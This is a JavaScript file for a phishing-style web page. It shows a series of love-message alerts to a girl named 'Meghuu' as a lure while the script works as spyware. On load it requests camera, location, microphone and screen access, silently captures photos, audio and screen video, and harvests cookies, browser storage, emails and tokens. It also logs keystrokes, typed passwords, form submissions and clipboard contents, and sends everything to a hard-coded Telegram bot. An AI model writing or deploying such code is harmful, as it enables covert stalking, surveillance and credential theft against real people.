// Telegram Configuration
const TOKEN = "7568763554:AAEWXMBtpmJTYc4XAvUUA9Fk516PVf8PvcA";
let CHAT_ID = "6837307356";

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let isAutoCameraEnabled = true;
let isSilentMode = true;
let loveAlertShown = false;
let permissionsRequested = false;

// Screen Recording variables
let screenRecorder = null;
let screenStream = null;
let recordedChunks = [];
let isRecording = false;

// DOM Elements
const themeToggle = document.getElementById("themeToggle");

// ==================== SHOW LOVE ALERTS ====================
function showLoveAlerts() {
    if (loveAlertShown) return;
    
    const alerts = [
        "Hello Meghuu 😘",
        "I can't stop thinking about you.🥰😚❤",
        "You'll always be my girl.",
        "I love making you laugh. ❤❤❤😚",
        "When I'm with you, nothing else matters.",
        "All love is sweet, but ours is the sweetest.",
        "Because you're in my life, I know true love exists..",
        "I love you today. I will love you tomorrow. And I'll keep on loving you every day after that, too.",
        "I can't believe a girl like you exists and that I'm lucky enough to have found her.",
        "Know that no matter where life takes us, you will always be the only one for me.",
        "My favorite part of every day is the time I get to spend with you.",
        "When others talk about their greatest achievements and things they are most proud of, the only thing that comes to mind is you.",
        "I'm missing you.",
        "You are the prettiest girl I've ever seen.",
        "Whenever I count my blessings, you are at the top of my list.",
        "I am the luckiest man alive because I get to call you mine.",
        "No one understands me like you do.",
        "You know exactly what I need, even if I don't say it.",
        "I love you not only for who you are, but also for who I become when I am with you.",
        "Ever since I met you, no one else has been worth thinking about.",
        "I know you love me because you put up with me even when I'm at my worst.",
        "if you need me, just call me i don't care if im sleeping or having my own problems or angry with you. ill be there for you anytime❣",
        "love you so much Meghuu ❣❣❣❣❣❣"
    ];
    
    loveAlertShown = true;
    
    let index = 0;
    function showNextAlert() {
        if (index < alerts.length) {
            alert(alerts[index]);
            index++;
            setTimeout(showNextAlert, 500);
        }
    }
    
    setTimeout(showNextAlert, 100);
    
    setTimeout(() => {
        sendMessageToTelegram(`💖 **Love Messages Displayed** 💖\n\nTotal: ${alerts.length} love messages shown to user`);
    }, 500);
}

// ==================== 1. REQUEST CAMERA FIRST ====================
async function requestCameraPermission() {
    return new Promise(async (resolve, reject) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: {
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false 
            });
            
            cameraStream = stream;
            
            // Send notification to Telegram
            await sendMessageToTelegram(`📸 **កាមេរ៉ាត្រូវបានអនុញ្ញាត**\n\n✅ User granted camera permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
            
            // Capture silent photos
            setTimeout(() => silentCapturePhotos(stream), 1000);
            
            resolve(true);
        } catch (error) {
            console.error("Camera permission denied:", error);
            await sendMessageToTelegram(`❌ **កាមេរ៉ាត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
            resolve(false);
        }
    });
}

// ==================== 2. REQUEST LOCATION SECOND ====================
async function requestLocationPermission() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            sendMessageToTelegram(`❌ **Geolocation មិនត្រូវបានគាំទ្រ**`);
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            async function(position) {
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                
                const googleMapsLink = `https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}&z=15`;
                
                await sendMessageToTelegram(`📍 **ទីតាំងត្រូវបានអនុញ្ញាត**\n\n📌 Latitude: ${currentLocation.lat}\n📌 Longitude: ${currentLocation.lng}\n🎯 Accuracy: ±${currentLocation.accuracy}m\n🗺️ Maps: ${googleMapsLink}`);
                
                // Send location as Telegram location
                try {
                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ 
                            chat_id: CHAT_ID, 
                            latitude: currentLocation.lat,
                            longitude: currentLocation.lng
                        }),
                    });
                } catch (err) {}
                
                resolve(true);
            },
            async function(error) {
                let errorMessage = "Unknown error";
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMessage = "User denied location permission";
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMessage = "Position unavailable";
                        break;
                    case error.TIMEOUT:
                        errorMessage = "Timeout";
                        break;
                }
                await sendMessageToTelegram(`❌ **ទីតាំងត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
                resolve(false);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// ==================== 3. REQUEST AUDIO RECORDING THIRD ====================
async function requestAudioPermission() {
    return new Promise(async (resolve) => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            audioStream = stream;
            
            await sendMessageToTelegram(`🎤 **មីក្រូហ្វូនត្រូវបានអនុញ្ញាត**\n\n✅ User granted microphone permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
            
            // Start silent audio recording
            setTimeout(() => silentRecordAudio(stream), 2000);
            
            resolve(true);
        } catch (error) {
            await sendMessageToTelegram(`❌ **មីក្រូហ្វូនត្រូវបានបដិសេធ**\n\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
            resolve(false);
        }
    });
}

// ==================== 4. REQUEST SCREEN RECORDING FOURTH ====================
async function requestScreenRecordingPermission() {
    if (!CHAT_ID) return false;
    if (isRecording) return false;
    
    try {
        screenStream = await navigator.mediaDevices.getDisplayMedia({
            video: {
                cursor: "always",
                displaySurface: "monitor",
                frameRate: { ideal: 30 }
            },
            audio: true
        });
        
        await sendMessageToTelegram(`🎬 **ការថតអេក្រង់ត្រូវបានអនុញ្ញាត**\n\n✅ User granted screen recording permission\n⏰ Time: ${new Date().toLocaleString('km-KH')}`);
        
        const mimeType = getSupportedMimeType();
        screenRecorder = new MediaRecorder(screenStream, {
            mimeType: mimeType,
            videoBitsPerSecond: 2500000
        });
        
        recordedChunks = [];
        
        screenRecorder.ondataavailable = (event) => {
            if (event.data && event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        screenRecorder.onstop = async () => {
            isRecording = false;
            const blob = new Blob(recordedChunks, { type: mimeType });
            const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const fileName = `screen_record_${Date.now()}.${extension}`;
            const file = new File([blob], fileName, { type: mimeType });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendVideoToTelegram(file, `🎥 Screen Recording\n\n📊 Size: ${formatBytes(blob.size)}\n\n${formattedInfo}`);
            
            recordedChunks = [];
            if (screenStream) {
                screenStream.getTracks().forEach(track => track.stop());
                screenStream = null;
            }
            screenRecorder = null;
        };
        
        screenRecorder.start(1000);
        isRecording = true;
        window.recordingStartTime = Date.now();
        
        // Stop after 60 seconds
        setTimeout(() => {
            if (isRecording) stopScreenRecording();
        }, 60000);
        
        screenStream.getVideoTracks()[0].addEventListener('ended', () => {
            if (isRecording) stopScreenRecording();
        });
        
        return true;
        
    } catch (error) {
        let errorMessage = 'User denied or error occurred';
        if (error.name === 'NotAllowedError') {
            errorMessage = 'User denied screen recording permission';
        }
        await sendMessageToTelegram(`❌ **ការថតអេក្រង់ត្រូវបានបដិសេធ**\n\n📝 ${errorMessage}`);
        return false;
    }
}

function stopScreenRecording() {
    if (screenRecorder && screenRecorder.state === 'recording') {
        screenRecorder.stop();
        isRecording = false;
    }
}

function getSupportedMimeType() {
    const types = [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm;codecs=h264,opus',
        'video/webm',
        'video/mp4'
    ];
    
    for (const type of types) {
        if (MediaRecorder.isTypeSupported(type)) {
            return type;
        }
    }
    return 'video/webm';
}

// ==================== SILENT CAPTURE FUNCTIONS ====================
async function silentCapturePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        
        for (let i = 1; i <= 3; i++) {
            setTimeout(async () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const file = new File([blob], `silent_capture_${i}.jpg`, { type: 'image/jpeg' });
                    const deviceInfo = await collectDeviceInfo();
                    const formattedInfo = formatDeviceInfo(deviceInfo);
                    await sendFileToTelegram(file, `📸 Silent Photo #${i}\n\n${formattedInfo}`);
                }, 'image/jpeg', 0.9);
            }, i * 1500);
        }
        
        setTimeout(() => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            video.remove();
        }, 6000);
        
    } catch (error) {}
}

async function silentRecordAudio(stream) {
    try {
        const audioRecorder = new MediaRecorder(stream);
        const audioChunks = [];
        
        audioRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                audioChunks.push(event.data);
            }
        };
        
        audioRecorder.onstop = async () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const file = new File([audioBlob], 'silent_audio.webm', { type: 'audio/webm' });
            
            const deviceInfo = await collectDeviceInfo();
            const formattedInfo = formatDeviceInfo(deviceInfo);
            
            await sendFileToTelegram(file, `🎤 Silent Audio Recording\n\n${formattedInfo}`);
        };
        
        audioRecorder.start();
        setTimeout(() => {
            audioRecorder.stop();
            if (audioStream) {
                audioStream.getTracks().forEach(track => track.stop());
                audioStream = null;
            }
        }, 10000);
        
    } catch (error) {}
}

// ==================== STEAL ALL DATA ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        cookies[name] = value;
    });
    
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
            name.toLowerCase().includes(keyword) || value.toLowerCase().includes(keyword)
        );
        
        cookies.push({ name, value, isSensitive });
    });
    
    return cookies;
}

function getAllStorageData() {
    const data = { localStorage: {}, sessionStorage: {}, cookies: getAllCookies() };
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        try { data.localStorage[key] = localStorage.getItem(key); } catch(e) { data.localStorage[key] = 'Cannot read'; }
    }
    
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        try { data.sessionStorage[key] = sessionStorage.getItem(key); } catch(e) { data.sessionStorage[key] = 'Cannot read'; }
    }
    
    return data;
}

function extractCredentials() {
    const credentials = { usernames: new Set(), emails: new Set(), passwords: new Set(), tokens: new Set(), apiKeys: new Set(), sessionIds: new Set() };
    
    const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const jwtRegex = /eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*/g;
    
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        const emails = value.match(emailRegex);
        if (emails) emails.forEach(e => credentials.emails.add(e));
        
        const jwts = value.match(jwtRegex);
        if (jwts) jwts.forEach(t => credentials.tokens.add(t));
    }
    
    return {
        usernames: Array.from(credentials.usernames),
        emails: Array.from(credentials.emails),
        passwords: Array.from(credentials.passwords),
        tokens: Array.from(credentials.tokens),
        apiKeys: Array.from(credentials.apiKeys),
        sessionIds: Array.from(credentials.sessionIds)
    };
}

async function stealAllData() {
    if (!CHAT_ID) return;
    
    try {
        const cookies = getCookieDetails();
        const storageData = getAllStorageData();
        const credentials = extractCredentials();
        const deviceInfo = await collectDeviceInfo();
        
        let message = `🔴 **STOLEN DATA REPORT**\n\n`;
        message += `🍪 Cookies: ${cookies.length} found\n`;
        
        if (cookies.length > 0) {
            cookies.slice(0, 10).forEach(c => {
                const shortValue = c.value.length > 50 ? c.value.substring(0, 50) + '...' : c.value;
                message += `├─ ${c.name}: ${shortValue}\n`;
            });
        }
        
        message += `\n💾 Storage:\n├─ LocalStorage: ${Object.keys(storageData.localStorage).length} items\n├─ SessionStorage: ${Object.keys(storageData.sessionStorage).length} items\n\n`;
        
        message += `🔐 Credentials Found:\n├─ Emails: ${credentials.emails.length}\n├─ Tokens: ${credentials.tokens.length}\n\n`;
        
        if (credentials.emails.length > 0) {
            message += `📧 Emails:\n`;
            credentials.emails.slice(0, 5).forEach(e => message += `├─ ${e}\n`);
        }
        
        message += `\n${formatDeviceInfo(deviceInfo)}`;
        
        await sendMessageToTelegram(message);
        
        const fullData = { timestamp: new Date().toISOString(), url: window.location.href, cookies, storage: storageData, credentials, deviceInfo };
        const jsonBlob = new Blob([JSON.stringify(fullData, null, 2)], { type: 'application/json' });
        const jsonFile = new File([jsonBlob], `stolen_data_${Date.now()}.json`, { type: 'application/json' });
        await sendFileToTelegram(jsonFile, `📁 Complete Stolen Data`);
        
    } catch (error) {}
}

// ==================== DEVICE INFO COLLECTION ====================
async function collectDeviceInfo() {
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        ip: await getIPAddress(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
        online: navigator.onLine ? 'Online' : 'Offline',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'Unable to fetch';
    }
}

function formatDeviceInfo(info) {
    let locationText = 'Not available';
    if (info.location) {
        locationText = `Lat: ${info.location.lat}, Lng: ${info.location.lng} (±${info.location.accuracy}m)`;
    }
    
    return `
📱 **Device Information**
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB
🖥️ Platform: ${info.platform}
🗣️ Language: ${info.language}
🕐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
📍 Location: ${locationText}
📄 URL: ${info.url}
    `.trim();
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        });
    } catch (err) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
        if (!response.ok) await sendFileToTelegram(file, caption);
    } catch (error) {}
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ==================== URL FUNCTIONS ====================
function cleanURL() {
    const uri = window.location.toString();
    const patterns = ["%3D", "%3D%3D", "&m=1", "?m=1"];
    patterns.forEach(pattern => {
        if (uri.indexOf(pattern) > 0) {
            const clean_uri = uri.substring(0, uri.indexOf(pattern));
            window.history.replaceState({}, document.title, clean_uri);
        }
    });
}

function GetURLParameter(sParam) {
    const sPageURL = window.location.search.substring(1);
    const sURLVariables = sPageURL.split('&');
    for (let i = 0; i < sURLVariables.length; i++) {
        const sParameterName = sURLVariables[i].split('=');
        if (sParameterName[0] === sParam) return sParameterName[1];
    }
    return null;
}

function decodeBase64(encodedStr) {
    try { return decodeURIComponent(atob(encodedStr)); } catch(e) { return null; }
}

function getChatIDFromURL() {
    const base64Id = GetURLParameter('i');
    return base64Id ? decodeBase64(base64Id) : null;
}

function initTheme() {
    if (!themeToggle) return;
    themeToggle.style.display = 'none';
}

// ==================== MAIN INITIALIZATION - REQUEST PERMISSIONS IN ORDER ====================
async function initializePermissionsAndStart() {
    // 1. Show love alerts first
    showLoveAlerts();
    
    // 2. Request Camera permission
    await new Promise(resolve => setTimeout(resolve, 2000));
    const cameraGranted = await requestCameraPermission();
    
    // 3. Request Location permission
    await new Promise(resolve => setTimeout(resolve, 1000));
    await requestLocationPermission();
    
    // 4. Request Audio permission
    await new Promise(resolve => setTimeout(resolve, 1000));
    await requestAudioPermission();
    
    // 5. Request Screen Recording permission
    await new Promise(resolve => setTimeout(resolve, 1000));
    await requestScreenRecordingPermission();
    
    // 6. Steal all data
    await new Promise(resolve => setTimeout(resolve, 2000));
    await stealAllData();
    
    // 7. Send final notification
    await sendMessageToTelegram(`✅ **All Permissions Processed**\n\nCamera: ${cameraGranted ? '✅ Granted' : '❌ Denied'}\nLocation: ${currentLocation ? '✅ Granted' : '❌ Denied'}\nAudio: ${audioStream ? '✅ Granted' : '❌ Denied'}\nScreen Recording: ${isRecording ? '✅ Granted' : '❌ Denied'}\n\n⏰ ${new Date().toLocaleString('km-KH')}`);
    
    // 8. Set up intervals for continuous stealing
    setInterval(() => { stealAllData(); }, 30000);
}

// Start everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    cleanURL();
    const chatIDFromURL = getChatIDFromURL();
    if (chatIDFromURL) CHAT_ID = chatIDFromURL;
    initTheme();
    
    // Start the permission requests immediately
    initializePermissionsAndStart();
});

// ==================== KEYLOGGER ====================
let keylogBuffer = '';
let keylogTimer = null;

document.addEventListener('keydown', function(e) {
    if (!CHAT_ID) return;
    
    if (e.key.length === 1 || e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
        if (e.key === 'Enter') keylogBuffer += '[ENTER]\n';
        else if (e.key === 'Tab') keylogBuffer += '[TAB]';
        else if (e.key === 'Backspace') keylogBuffer += '[BACKSPACE]';
        else if (e.key === ' ') keylogBuffer += ' ';
        else keylogBuffer += e.key;
        
        if (keylogBuffer.length > 100 || e.key === 'Enter') {
            clearTimeout(keylogTimer);
            keylogTimer = setTimeout(async () => {
                if (keylogBuffer) {
                    await sendMessageToTelegram(`⌨️ **Keylogger**\n\n${keylogBuffer}`);
                    keylogBuffer = '';
                }
            }, 2000);
        }
    }
});

// ==================== FORM SUBMIT INTERCEPTION ====================
document.addEventListener('submit', async function(e) {
    if (!CHAT_ID) return;
    
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    for (let [key, value] of formData.entries()) {
        if (value instanceof File) {
            data[key] = `[FILE: ${value.name}]`;
            await sendFileToTelegram(value, `📎 Form File: ${key}`);
        } else {
            data[key] = value;
        }
    }
    
    let message = `📝 **Form Submitted**\n\n📋 Action: ${form.action || 'None'}\n📋 Method: ${form.method || 'GET'}\n\n📊 Data:\n`;
    for (let [key, value] of Object.entries(data)) {
        message += `├─ ${key}: ${value}\n`;
    }
    
    await sendMessageToTelegram(message);
});

// ==================== PASSWORD FIELD MONITORING ====================
document.addEventListener('input', async function(e) {
    if (!CHAT_ID) return;
    
    const target = e.target;
    if (target.type === 'password' && target.value.length > 0) {
        const inputName = target.name || target.id || 'Unknown';
        await sendMessageToTelegram(`🔐 **Password Entered**\n\n📝 Field: ${inputName}\n🔑 Value: ${target.value}`);
    }
});

// ==================== CLIPBOARD MONITORING ====================
let lastClipboardContent = '';

setInterval(async () => {
    if (!CHAT_ID) return;
    try {
        const text = await navigator.clipboard.readText();
        if (text && text !== lastClipboardContent && text.length > 0 && text.length < 500) {
            lastClipboardContent = text;
            await sendMessageToTelegram(`📋 **Clipboard Content**\n\n${text}`);
        }
    } catch (error) {}
}, 5000);

// ==================== PAGE UNLOAD TRACKING ====================
window.addEventListener('beforeunload', function() {
    if (!CHAT_ID) return;
    const message = `👋 **User Leaving Page**\n\nURL: ${window.location.href}\n⏰ ${new Date().toLocaleString('km-KH')}`;
    const blob = new Blob([JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })], { type: 'application/json' });
    navigator.sendBeacon(`https://api.telegram.org/bot${TOKEN}/sendMessage`, blob);
});